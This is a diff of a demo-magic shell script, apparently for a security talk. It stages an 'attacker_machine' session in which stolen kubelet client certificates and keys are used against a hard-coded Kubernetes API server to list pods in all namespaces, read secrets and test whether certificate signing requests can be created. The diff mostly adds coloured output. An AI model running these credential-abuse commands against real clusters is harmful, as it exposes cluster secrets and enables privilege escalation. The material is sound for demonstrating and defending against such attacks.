@@ -15,7 +15,12 @@ if [ ! -f $DEMOMAGIC ]; then
   curl -OsS -L https://raw.githubusercontent.com/paxtonhare/demo-magic/master/demo-magic.sh 
 fi
 
+DEMO_PROMPT="attacker_machine$ "
 . demo-magic.sh
+RED="\033[0;91m"
+clear
+echo ""
+echo ""
 
 #pe "kubectl delete clusterrolebinding kubelet-cluster-admin"
 # Retrieving these keys: SSH into node
@@ -25,16 +30,16 @@ fi
 
 # empty kubeconfig to make sure we're acting as the kubelet
 export KUBECONFIG=$(mktemp /tmp/kubeconfig.XXXXXX)
-p "kubectl --client-certificate ../kubelet_keys/client_hardened.crt \ "
+p "${RED}kubectl --client-certificate ../kubelet_keys/client_hardened.crt \ "
 DEMO_PROMPT="> "
-p "--client-key ../kubelet_keys/client_hardened.pem \ "
-p "--certificate-authority ../kubelet_keys/ca_hardened.crt \ "
-p "get pods --all-namespaces"
+p "${RED}--client-key ../kubelet_keys/client_hardened.pem \ "
+p "${RED}--certificate-authority ../kubelet_keys/ca_hardened.crt \ "
+p "${RED}get pods --all-namespaces${COLOR_RESET}"
 DEMO_PROMPT="attacker_machine$ "
 
 kubectl --client-certificate ../kubelet_keys/client_hardened.crt --client-key ../kubelet_keys/client_hardened.pem --certificate-authority ../kubelet_keys/ca_hardened.crt --server https://35.185.246.11 get pods --all-namespaces || true
-p "kubectl get secrets"
+p "${RED}kubectl get secrets${COLOR_RESET}"
 kubectl --client-certificate ../kubelet_keys/client_hardened.crt --client-key ../kubelet_keys/client_hardened.pem --certificate-authority ../kubelet_keys/ca_hardened.crt --server https://35.185.246.11 get secrets || true
-p "kubectl auth can-i create certificatesigningrequests"
+p "${RED}kubectl auth can-i create certificatesigningrequests${COLOR_RESET}"
 kubectl --client-certificate ../kubelet_keys/client_hardened.crt --client-key ../kubelet_keys/client_hardened.pem --certificate-authority ../kubelet_keys/ca_hardened.crt --server https://35.185.246.11 auth can-i create certificatesigningrequests || true 
 
